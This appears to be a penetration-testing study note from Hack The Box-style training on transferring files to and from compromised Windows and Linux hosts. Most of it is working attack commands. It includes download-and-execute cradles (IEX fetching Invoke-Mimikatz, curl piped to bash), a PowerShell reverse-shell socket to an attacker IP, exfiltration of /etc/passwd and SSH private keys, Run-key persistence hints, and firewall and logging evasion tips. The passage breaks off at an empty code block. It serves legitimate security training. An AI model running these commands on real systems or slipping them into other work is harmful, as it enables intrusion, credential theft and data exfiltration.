# File Transfers

## Windows File Transfer Methods

### The Master .NET Static Methods Reference Table

| **Category**            | **.NET Class Shortcut**                                                                                                    | **Common Static Methods & Properties**                                                                                                                                                                        | **Practical PowerShell Syntax Example**                                                                                                                                           | **Purpose & Security/Admin Use Case**                                                                                                                     |
| ----------------------- | -------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **File Manipulation**   | `[IO.File]`                                                                                                                | <p><code>::Exists()</code><br><br><br><br><code>::ReadAllText()</code><br><br><br><br><code>::WriteAllBytes()</code><br><br><br><br><code>::AppendAllText()</code><br><br><br><br><code>::Delete()</code></p> | <p><code>[IO.File]::Exists("C:\Windows\System32\cmd.exe")</code><br><br><br><br><br><code>[IO.File]::WriteAllBytes("$env:public\payload.exe", $bytes)</code></p>                  | Interacts directly with files. Bypasses standard event logs that track commands like `Get-Content` or `Out-File`. Used for silent file dropping.          |
| **Directory Handling**  | `[IO.Directory]`                                                                                                           | <p><code>::Exists()</code><br><br><br><br><code>::CreateDirectory()</code><br><br><br><br><code>::GetFiles()</code><br><br><br><br><code>::GetDirectories()</code></p>                                        | <p><code>[IO.Directory]::GetFiles("C:\Users\Public")</code><br><br><br><br><br><code>[IO.Directory]::CreateDirectory("C:\HiddenFolder")</code></p>                                | Enumerates file system trees, identifies hidden shares, or creates stealth operational paths inside the operating system.                                 |
| **Path String Parsing** | `[IO.Path]`                                                                                                                | <p><code>::GetExtension()</code><br><br><br><br><code>::GetFileName()</code><br><br><br><br><code>::Combine()</code><br><br><br><br><code>::GetTempPath()</code></p>                                          | <p><code>[IO.Path]::GetExtension("C:\test\malicious.jpg.exe")</code><br><br><br><br><br><code>[IO.Path]::Combine("C:\Target", "subfolder")</code></p>                             | Sanitizes and manipulates file path structures. `::GetTempPath()` dynamically locates the active user's temp directory.                                   |
| **Data Encoding**       | `[Convert]`                                                                                                                | <p><code>::ToBase64String()</code><br><br><br><br><code>::FromBase64String()</code><br><br><br><br><code>::ToInt32()</code><br><br><br><br><code>::ToString()</code></p>                                      | <p><code>[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("secret"))</code><br><br><br><br><br><code>[Convert]::ToInt32("0x41", 16)</code></p>                     | Encodes reverse shells and scripts into Base64 to bypass standard network Firewalls/IDS filters. Also handles Hex-to-Integer math.                        |
| **Text & Strings**      | `[Text.Encoding]`                                                                                                          | <p><code>::UTF8</code><br><br><br><br><code>::ASCII</code><br><br><br><br><code>::Unicode</code><br><br><br><br><code>[String]::IsNullOrEmpty()</code></p>                                                    | <p><code>[Text.Encoding]::UTF8.GetString($rawBytes)</code><br><br><br><br><br><code>[String]::IsNullOrEmpty($inputVariable)</code></p>                                            | Transforms raw memory streams or file bytes back into readable ASCII/UTF8 strings, and validates parameters.                                              |
| **System Environment**  | `[Environment]`                                                                                                            | <p><code>::UserName</code><br><br><br><br><code>::MachineName</code><br><br><br><br><code>::Is64BitOperatingSystem</code><br><br><br><br><code>::GetEnvironmentVariable()</code></p>                          | <p><code>[Environment]::UserName</code><br><br><br><br><br><code>[Environment]::GetEnvironmentVariable("Path")</code></p>                                                         | Conducts initial machine reconnaissance. Discovers current user privilege context, system architecture, and ambient environmental paths.                  |
| **Process Control**     | `[Diagnostics.Process]`                                                                                                    | <p><code>::GetProcesses()</code><br><br><br><br><code>::GetCurrentProcess()</code><br><br><br><br><code>::GetProcessById()</code><br><br><br><br><code>::Start()</code></p>                                   | <p><code>[Diagnostics.Process]::GetProcesses() | Where-Object {$_.ProcessName -eq "lsass"}</code><br><br><br><br><br><code>[Diagnostics.Process]::Start("notepad.exe")</code></p> | Monitors active background processes, looks for defense software (AV/EDR PIDs), and executes external system processes.                                   |
| **Windows Registry**    | `[Microsoft.Win32.Registry]`                                                                                               | <p><code>::LocalMachine</code><br><br><br><br><code>::CurrentUser</code><br><br><br><br><code>::ClassesRoot</code><br><br><br><br><code>::Users</code></p>                                                    | `[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run")`                                                                            | Queries and alters critical Windows configurations. Used directly to configure persistence mechanisms (e.g., Run keys) or check system policies.          |
| **Security Tracking**   | <p><code>[Security.Principal.WindowsIdentity]</code><br><br><br><br><code>[Security.Principal.WindowsPrincipal]</code></p> | <p><code>::GetCurrent()</code><br><br><br><br><code>::IsInRole()</code></p>                                                                                                                                   | <p><code>$id = [Security.Principal.WindowsIdentity]::GetCurrent()</code><br><br><br><br><br><code>(New-Object Security.Principal.WindowsPrincipal($id)).IsInRole(512)</code></p>  | Identifies the execution token properties of the current prompt. Code `512` parses if you are operating inside the Local Domain Administrators group.     |
| **Networking & DNS**    | `[Net.Dns]`                                                                                                                | <p><code>::GetHostAddresses()</code><br><br><br><br><code>::GetHostEntry()</code><br><br><br><br><code>::GetHostName()</code></p>                                                                             | <p><code>[Net.Dns]::GetHostAddresses("target.local")</code><br><br><br><br><br><code>[Net.Dns]::GetHostEntry("192.168.1.1").HostName</code></p>                                   | Queries internal network name maps. Performs forward DNS lookups and passive reverse IP sweeps without external dependencies.                             |
| **Advanced Memory**     | `[Runtime.InteropServices.Marshal]`                                                                                        | <p><code>::Copy()</code><br><br><br><br><code>::ReadInt32()</code><br><br><br><br><code>::WriteByte()</code><br><br><br><br><code>::AllocHGlobal()</code></p>                                                 | `[Runtime.InteropServices.Marshal]::AllocHGlobal(1024)`                                                                                                                           | Advanced low-level utility. Directly allocates, reads, or updates unmanaged Windows system memory. Frequently utilized in shellcode injection techniques. |
| **Mathematical Engine** | `[Math]`                                                                                                                   | <p><code>::Abs()</code><br><br><br><br><code>::Sqrt()</code><br><br><br><br><code>::Pow()</code><br><br><br><br><code>::Round()</code></p>                                                                    | <p><code>[Math]::Sqrt(144)</code><br><br><br><br><br><code>[Math]::Pow(2, 10)</code></p>                                                                                          | Performs complex server math computations, log calculations, encryption offsets, or sizing routines entirely within memory.                               |
| **Time & Logging**      | `[DateTime]`                                                                                                               | <p><code>::Now</code><br><br><br><br><code>::UtcNow</code><br><br><br><br><code>::Parse()</code></p>                                                                                                          | <p><code>[DateTime]::Now</code><br><br><br><br><br><code>[DateTime]::UtcNow.ToString("yyyy-MM-dd")</code></p>                                                                     | Grabs highly specific timestamps for tracking execution routines, timing blind database injections, or stamping administrative tracking scripts.          |

| **Category**                | **.NET Class / Type Accelerator** | **Key Static/Instance Methods**                                                                                                   | **Practical PowerShell Syntax Example**                                                                                                            | **Purpose & Cyber Security / Admin Use Case**                                                                                                                                        |
| --------------------------- | --------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **File Transfer & Cradles** | `[Net.WebClient]`                 | <p><code>.DownloadString()</code><br><br><br><br><code>.DownloadFile()</code><br><br><br><br><code>.UploadData()</code></p>       | \`(New-Object Net.WebClient).DownloadString("http://10.10.10.10/shell.ps1") \\                                                                     | IEX\`                                                                                                                                                                                |
| **Modern Web & APIs**       | `[Net.Http.HttpClient]`           | <p><code>.GetStringAsync()</code><br><br><br><br><code>.PostAsync()</code><br><br><br><br><code>.SendAsync()</code></p>           | <p><code>$client = [Net.Http.HttpClient]::new();</code><br><br><br><br><code>$client.GetStringAsync("https://api.target.com/v1").Result</code></p> | The modern, multi-threaded replacement for WebClient. Ideal for scripting high-speed API fuzzing, custom exploit delivery, or handling complex JSON web REST requests.               |
| **SSL/TLS Control**         | `[Net.ServicePointManager]`       | <p><code>::SecurityProtocol</code><br><br><br><br><code>::ServerCertificateValidationCallback</code></p>                          | `[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`                                                                         | **Critical for Labs:** Forces PowerShell to accept untrusted/self-signed SSL certificates (like accessing Nessus on `https://localhost:8834`) or forces TLS 1.2/1.3 protocol states. |
| **DNS Resolution**          | `[Net.Dns]`                       | <p><code>::GetHostAddresses()</code><br><br><br><br><code>::GetHostEntry()</code><br><br><br><br><code>::GetHostName()</code></p> | `[Net.Dns]::GetHostAddresses("target.local")`                                                                                                      | Performs rapid infrastructure reconnaissance. Translates domain names to IP addresses or performs reverse lookups to find active hostnames in a subnet.                              |
| **Raw Sockets & Shells**    | `[Net.Sockets.TcpClient]`         | <p><code>.Connect()</code><br><br><br><br><code>.GetStream()</code><br><br><br><br><code>.Close()</code></p>                      | <p><code>$client = [Net.Sockets.TcpClient]::new("10.10.14.4", 4444);</code><br><br><br><br><code>$stream = $client.GetStream()</code></p>          | Bypasses standard command utilities to spawn raw network sockets. Used to build lightweight internal port scanners or construct pure PowerShell interactive reverse shells.          |
| **Listener Configuration**  | `[Net.Sockets.TcpListener]`       | <p><code>.Start()</code><br><br><br><br><code>.AcceptTcpClient()</code></p>                                                       | <p><code>$listener = [Net.Sockets.TcpListener]::new(8080);</code><br><br><br><br><code>$listener.Start()</code></p>                                | Binds a port locally on your machine to listen for incoming connections. Useful for spinning up a quick terminal handler or payload staging trigger.                                 |
| **Host Discovery**          | `[Net.NetworkInformation.Ping]`   | `.Send()`                                                                                                                         | `[Net.NetworkInformation.Ping]::new().Send("192.168.1.1", 500)`                                                                                    | Programmatically instantiates an ICMP ping frame. Essential for fast, automated multi-threaded network sweeping scripts.                                                             |
| **IP Management**           | `[Net.IPAddress]`                 | <p><code>::Parse()</code><br><br><br><br><code>::Any</code><br><br><br><br><code>::Loopback</code></p>                            | `[Net.IPAddress]::Parse("192.168.1.50")`                                                                                                           | Validates, sanitizes, and converts standard IP string formats into raw network byte configurations required by low-level socket connections.                                         |
| **Authentication**          | `[Net.NetworkCredential]`         | <p><code>.UserName</code><br><br><br><br><code>.Password</code></p>                                                               | `$cred = [Net.NetworkCredential]::new("admin", "Password123")`                                                                                     | Stores and injects raw authentication credentials or domain security context tokens safely into web clients and proxy connections.                                                   |

**Pwnbox Check SSH Key MD5 Hash**

```
Umedh@htb[/htb]$ md5sum id_rsa 4e301756a07ded0a2dd6953abf015278  id_rsa
```

**Pwnbox Encode SSH Key to Base64**

```
Umedh@htb[/htb]$ cat id_rsa |base64 -w 0;echo 

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYj....SNIP.....BLRVktLS0tLQo=
```

We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.

```
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYj....SNIP.....BLRVktLS0tLQo="))
```

Finally, we can confirm if the file was transferred successfully using the [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet, which does the same thing that `md5sum` does.

**Confirming the MD5 Hashes Match**

```
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5 Algorithm       Hash                                                                   Path ---------       ----                                                                   ---- MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa]
```

### PowerShell Web Downloads

Most companies allow `HTTP` and `HTTPS` outbound traffic through the firewall to allow employee productivity.

| **Method**                                                                                                               | **Description**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |

```
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1') 

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>') 

PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

**PowerShell DownloadString - Fileless Method**

As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.

```
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

**PowerShell Invoke-WebRequest**

From PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.

```
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

## FTP And SMB Methods To Download The Content

The provided text demonstrates how to staging and transfer tools (like Netcat `nc.exe` or data files) from an attacker infrastructure (Linux/Pwnbox) to a target Windows machine. It focuses on utilizing two built-in enterprise network protocols:

1. **SMB (Server Message Block - TCP/445):** Ideal for Windows environments. The text shows how to bypass modern Windows restrictions that block unauthenticated guest shares by enforcing credentials.
2. **FTP (File Transfer Protocol - TCP/21):** A classic alternative. The text demonstrates how to host a quick FTP server using Python and scripts automated downloads for situations where you only have a restrictive, non-interactive shell.

### 1. SMB Downloads: Command Breakdown

#### Creating an Unauthenticated SMB Share

Bash

```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

* **`sudo`**: Runs the command with root privileges (required to bind to restricted system ports).
* **`impacket-smbserver`**: Launches the Impacket python script that simulates a Windows SMB file server.
* **`share`**: The arbitrary name given to the network share. Windows targets will connect to `\\<IP>\share`.
* **`-smb2support`**: Crucial flag that forces the server to speak SMBv2. Modern Windows versions reject legacy SMBv1 by default for security.
* **`/tmp/smbshare`**: The local path on your Linux attack machine where your payload files are sitting.

#### Copying via Guest Access (Older Windows Targets)

DOS

```
copy \\192.168.220.133\share\nc.exe
```

* **`copy`**: Native Windows command-line utility to copy files.
* **`\\192.168.220.133\share\`**: The Network path (UNC path) pointing to your Linux machine's SMB share.
* **`nc.exe`**: The file being pulled down to the current working directory on the target.

#### Creating an Authenticated SMB Share

> 💡 Modern Windows builds block unauthenticated guest access to protect against rogue devices. To bypass this defense, you must require authentication on your share:

Bash

```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

* **`-user test -password test`**: Tells the Impacket server to reject anonymous connections and explicitly require the username `test` and password `test`.

#### Mounting and Extracting from the Authenticated Share

DOS

```
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

* **`net use n:`**: Windows command that mounts the remote SMB share and maps it visually to a local temporary virtual drive letter (`N:`).
* **`/user:test test`**: Supplies the required authentication credentials (`username` followed by `password`) to authorize the connection.
* **`copy n:\nc.exe`**: Copies the file safely from the freshly mounted local `N:` partition block.

### 2. FTP Downloads: Command Breakdown

#### Setting Up the Python FTP Infrastructure

Bash

```
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

* **`pip3 install pyftpdlib`**: Installs the Python FTP server engine library.
* **`-m pyftpdlib`**: Tells Python to run the newly installed module directly as a script execution.
* **`--port 21`**: Lowers the listener port from its default `2121` to the official standard FTP control port `21`. Requires `sudo` access to bind.

#### Downloading via PowerShell (Interactive Shell)

PowerShell

```
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

* **`(New-Object Net.WebClient)`**: Spins up a headless web browser object context inside system memory.
* **`.DownloadFile(...)`**: Executes a standard download-to-disk operation.
* **`'ftp://...'`**: The source protocol and remote address location of your target file.
* **`'C:\Users\Public\ftp-file.txt'`**: The destination write location on the target machine.

#### Non-Interactive Scripted FTP Execution

> ⚠️ **The Problem:** If you are operating inside a blind or non-interactive reverse shell, typing `ftp` will freeze your prompt because the interactive login prompt expects a keyboard response.
>
> **The Fix:** You write a text file configuration template containing your commands sequentially and feed it to the FTP client natively using the `-s` flag.

DOS

```
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
```

* **`>`**: Creates a new file called `ftpcommand.txt` and writes the connection instruction into it.
* **`>>`**: Appends the subsequent operational instructions to the bottom of the script sequentially.
* **`binary`**: Configures the FTP session mode to handle raw byte sequences cleanly (preventing the corruption of compiled `.exe` files).
* **`GET file.txt`**: Commands the FTP engine to pull the specified file.
* **`bye`**: Cleanly terminates the background session so your process doesn't hang forever.

DOS

```
ftp -v -n -s:ftpcommand.txt
```

* **`ftp`**: Launches the built-in Windows client.
* **`-v`**: Suppresses the output display response frames from the remote server.
* **`-n`**: Disables the initial automatic login sequence on launch so it can be handled inside your script.
* **`-s:ftpcommand.txt`**: Feeds the script file directly into the engine, processing every line automatically in the background without needing keyboard intervention.

### Windows Ingress (Download) Methods Matrix

| **Download Method**                            | **Linux Attack Host (Server Setup)**                                                     | **Windows Target (Download Command)**                                                                                                                                                                                              | **Protocol & Port**                                               | **Operational Mechanism / Use Case**                                                                                                                               |
| ---------------------------------------------- | ---------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **1. PowerShell Base64 In-Memory Drop**        | <p>No server required.<br><br><br><br><br><code>cat payload.exe | base64 -w 0</code></p> | `[IO.File]::WriteAllBytes("C:\path\file.exe", [Convert]::FromBase64String("BASE64_STR"))`                                                                                                                                          | <p><strong>None</strong><br><br><br><br>(CLI Paste)</p>           | **Fileless Delivery:** Bypasses network inspection entirely. Translates binary data into an ASCII string to drop files directly over a restrictive terminal shell. |
| **2. .NET WebClient (Standard)**               | `python3 -m http.server 80`                                                              | `(New-Object Net.WebClient).DownloadFile('http://<IP>/file.exe', 'C:\path\file.exe')`                                                                                                                                              | <p><strong>HTTP / HTTPS</strong><br><br><br><br>Port 80 / 443</p> | **Legacy Baseline:** Highly reliable fallback utility across all legacy PowerShell configurations when modern cmdlets are blocked or restricted.                   |
| **3. .NET WebClient (Asynchronous)**           | `python3 -m http.server 80`                                                              | `(New-Object Net.WebClient).DownloadFileAsync('http://<IP>/file.exe', 'C:\path\file.exe')`                                                                                                                                         | <p><strong>HTTP / HTTPS</strong><br><br><br><br>Port 80 / 443</p> | **Non-Blocking Transfer:** Downloads payloads cleanly in the background without freezing or blocking the active CLI prompt thread.                                 |
| **4. WebClient DownloadString (IEX)**          | `python3 -m http.server 80`                                                              | `IEX (New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')`                                                                                                                                                          | <p><strong>HTTP / HTTPS</strong><br><br><br><br>Port 80 / 443</p> | **Pure Fileless Cradles:** Pulls script code straight into volatile RAM and executes it via `IEX` without writing tracking bytes to the physical hard drive.       |
| **5. Native Web Cmdlet (`Invoke-WebRequest`)** | `python3 -m http.server 80`                                                              | <p><code>Invoke-WebRequest http://&#x3C;IP>/file.exe -OutFile file.exe</code><br><br><br><br><br><em>(Aliases: <code>iwr</code>, <code>wget</code>, <code>curl</code>)</em></p>                                                    | <p><strong>HTTP / HTTPS</strong><br><br><br><br>Port 80 / 443</p> | **Modern Default:** Built-in PowerShell 3.0+ cmdlet configuration. Simple syntax, but slightly slower execution speed due to DOM parsing.                          |
| **6. SMB Unauthenticated Guest Copy**          | `sudo impacket-smbserver share /tmp/folder -smb2support`                                 | `copy \\<Linux_IP>\share\file.exe C:\path\`                                                                                                                                                                                        | <p><strong>SMB</strong><br><br><br><br>Port 445</p>               | **Native Binary Copy:** Uses Windows native path tracking. Works on older systems or lab setups where guest access restrictions are turned off.                    |
| **7. SMB Authenticated Mount & Copy**          | `sudo impacket-smbserver share /tmp/folder -smb2support -user u -password p`             | <p><code>net use n: \&#x3C;Linux_IP>\share /user:u p</code><br><br><br><br><br><code>copy n:\file.exe C:\path&#x3C;/code></code></p>                                                                                               | <p><strong>SMB</strong><br><br><br><br>Port 445</p>               | **Modern OS Bypass:** Mounts a virtual drive letter explicitly providing authorization tokens to bypass modern corporate policies blocking guest shares.           |
| **8. FTP via WebClient Hook**                  | `sudo python3 -m pyftpdlib --port 21`                                                    | `(New-Object Net.WebClient).DownloadFile('ftp://<IP>/file.txt', 'C:\path\file.txt')`                                                                                                                                               | <p><strong>FTP</strong><br><br><br><br>Port 21</p>                | **Web Bypass:** Useful alternative when proxy filters or firewalls inspect HTTP strings heavily but leave standard FTP control lines unmonitored.                  |
| **9. Scripted FTP (Non-Interactive Client)**   | `sudo python3 -m pyftpdlib --port 21`                                                    | <p><code>echo open &#x3C;IP> > script.txt</code><br><br><br><br><code>echo USER anonymous >> script.txt</code><br><br><br><br><code>echo GET file.exe >> script.txt</code><br><br><br><br><code>ftp -v -n -s:script.txt</code></p> | <p><strong>FTP</strong><br><br><br><br>Port 21</p>                | **Blind Shell Execution:** Essential execution trick for raw, non-interactive reverse shells where processing an interactive prompt will hang the session.         |

### Windows-to-Linux File Upload Matrix

| **Upload Method**                   | **Linux Attack Host (Receiver Setup)**                                                                                                                              | **Windows Target (Sender Action)**                                                                                                                                                          | **Protocol & Port**                                          | **Key Practical Advantage / Use Case**                                                                                                                                  |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **1. PowerShell Base64 Copy-Paste** | <p>No server needed.<br><br><br><br><br><code>echo '&#x3C;string>' | base64 -d > file</code></p>                                                                    | \`\[Convert]::ToBase64String((Get-Content "C:\path" -Encoding byte)) \\                                                                                                                     | Set-Clipboard\`                                              | <p><strong>None</strong><br><br><br><br>(Text Terminal)</p>                                                                                                             |
| **2. PowerShell Web Upload**        | <p><code>pip3 install uploadserver</code><br><br><br><br><code>python3 -m uploadserver</code></p>                                                                   | <p><code>IEX(New-Object Net.WebClient).DownloadString('...PSUpload.ps1')</code><br><br><br><br><br><code>Invoke-FileUpload "C:\path" http://&#x3C;Linux_IP>:8000/upload</code></p>          | <p><strong>HTTP</strong><br><br><br><br>Port 8000</p>        | **Automated Scripting:** Ideal when HTTP/web egress traffic is allowed. Bypasses file system logs by loading the script tool straight into RAM (`IEX`).                 |
| **3. WebDAV (SMB-over-HTTP)**       | <p><code>pip3 install wsgidav cheroot</code><br><br><br><br><code>sudo wsgidav --host=0.0.0.0 --port=80 --root=. --auth=anonymous</code></p>                        | <p><code>copy C:\path \&#x3C;Linux_IP>\DavWWWRoot&#x3C;/code></code><br><br><br><br><br><em><code>(Or target a specific valid directory name like \sharefolder&#x3C;/code>)</code></em></p> | <p><strong>HTTP / WebDAV</strong><br><br><br><br>Port 80</p> | **Firewall Evasion:** Used when outbound SMB (TCP/445) is blocked by enterprise firewalls. Windows automatically tunnels standard `copy` actions inside an HTTP stream. |
| **4. FTP Upload**                   | <p><code>pip3 install pyftpdlib</code><br><br><br><br><code>sudo python3 -m pyftpdlib --port 21 --write</code> <em>(Make sure to add <code>--write</code>)</em></p> | `(New-Object Net.WebClient).UploadFile('ftp://<Linux_IP>/remote-name', 'C:\path')`                                                                                                          | <p><strong>FTP</strong><br><br><br><br>Port 21</p>           | **Legacy Alternative:** Useful when web traffic engines are monitored closely, but standard background .NET framework hooks can still talk over structural channels.    |

***

***

## Linux File Transfer

| **Executed On**     | **Command**                             | **Protocol/Service** | **Key Purpose**                                          |
| ------------------- | --------------------------------------- | -------------------- | -------------------------------------------------------- |
| **Target Server**   | `python3 -m http.server`                | HTTP (Port 8000)     | Starts a quick web server using Python 3 to share files. |
| **Target Server**   | `python2.7 -m SimpleHTTPServer`         | HTTP (Port 8000)     | Starts a web server using legacy Python 2.               |
| **Target Server**   | `php -S 0.0.0.0:8000`                   | HTTP (Port 8000)     | Starts a built-in PHP development web server.            |
| **Target Server**   | `ruby -run -ehttpd . -p8000`            | HTTP (Port 8000)     | Starts a built-in Ruby WEBrick web server.               |
| **Pwnbox (Attack)** | `wget <Target_IP>:8000/file.txt`        | HTTP                 | Downloads the file from the target's web server.         |
| **Pwnbox (Attack)** | `scp user@<Target_IP>:/path/file.txt .` | SSH/SCP (Port 22)    | Securely pulls a file from the target via SSH.           |

#### 1. Target ➡️ Attacker (Extracting Files from Target to Attack Host)

| Method / Protocol         | Command Execution Location | Command to Run                                                               | Required Service / Port Status                                                                             |
| ------------------------- | -------------------------- | ---------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| **Python 3 Web Root**     | **Target Server**          | `python3 -m http.server 8000`                                                | <p>Starts HTTP server on Target.<br><br><br><br><strong>Inbound TCP Port 8000 open on Target.</strong></p> |
| **PHP Web Root**          | **Target Server**          | `php -S 0.0.0.0:8000`                                                        | <p>Starts PHP server on Target.<br><br><br><br><strong>Inbound TCP Port 8000 open on Target.</strong></p>  |
| **Ruby Web Root**         | **Target Server**          | `ruby -run -ehttpd . -p8000`                                                 | <p>Starts Ruby server on Target.<br><br><br><br><strong>Inbound TCP Port 8000 open on Target.</strong></p> |
| **Web Download via Wget** | **Attacker System**        | `wget <Target_IP>:8000/flag.txt`                                             | Connects to the Target's active mini web server to pull the file.                                          |
| **Secure Web Upload**     | **Target Server**          | `curl -X POST https://<Pwnbox_IP>/upload -F 'files=@/etc/passwd' --insecure` | **On Pwnbox:** `uploadserver` module must be running on **Port 443**.                                      |

#### 2. Attacker ➡️ Target (Sending Tools/Payloads from Attack Host to Target)

| Method / Protocol             | Command Execution Location | Command to Run                                                                                                                                                                         | Required Service / Port Status                                                  |
| ----------------------------- | -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| **Standard Wget**             | **Target Server**          | `wget <Pwnbox_URL> -O /tmp/LinEnum.sh`                                                                                                                                                 | **On Pwnbox:** Web server hosting the file must be running.                     |
| **Standard cURL**             | **Target Server**          | `curl -o /tmp/LinEnum.sh <Pwnbox_URL>`                                                                                                                                                 | **On Pwnbox:** Web server hosting the file must be running.                     |
| **Fileless Bash Execution**   | **Target Server**          | \`curl \<Pwnbox\_URL> \\                                                                                                                                                               | bash\`                                                                          |
| **Fileless Python Execution** | **Target Server**          | \`wget -qO- \<Pwnbox\_URL> \\                                                                                                                                                          | python3\`                                                                       |
| **Bash /dev/tcp Script**      | **Target Server**          | <p><code>exec 3&#x3C;>/dev/tcp/&#x3C;Pwnbox_IP>/80</code><br><br><br><br><code>echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&#x26;3</code><br><br><br><br><code>cat &#x3C;&#x26;3</code></p> | Uses built-in Bash redirections to talk to Pwnbox on **Port 80**.               |
| **SCP Pull Download**         | **Target Server**          | `scp plaintext@<Pwnbox_IP>:/root/myroot.txt .`                                                                                                                                         | **On Pwnbox:** SSH service must be enabled and running (`sshd` on **Port 22**). |
| **SCP Push Upload**           | **Attacker System**        | `scp /etc/passwd htb-student@<Target_IP>:/home/htb-student/`                                                                                                                           | **On Target:** SSH service must be active and listening on **Port 22**.         |

#### 3. Local Clipboard Transfers (No Network Setup)

| Method                   | Command to Run                                                                                                                                                                                           | Service / Port Status                                                                    |
| ------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| **Base64 Encode/Decode** | <p><strong>Source (Encode):</strong> <code>cat id_rsa | base64 -w 0; echo</code><br><br><br><br><br><strong>Destination (Decode):</strong> <code>echo -n '&#x3C;string>' | base64 -d > id_rsa</code></p> | **None.** Uses terminal display text; completely bypasses firewalls and network routing. |

***

***

## Transferring Files with Code

### 🐍 Python Downloads

#### Python 2.7 One-Liner

Bash

```
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### Python 3 One-Liner

Bash

```
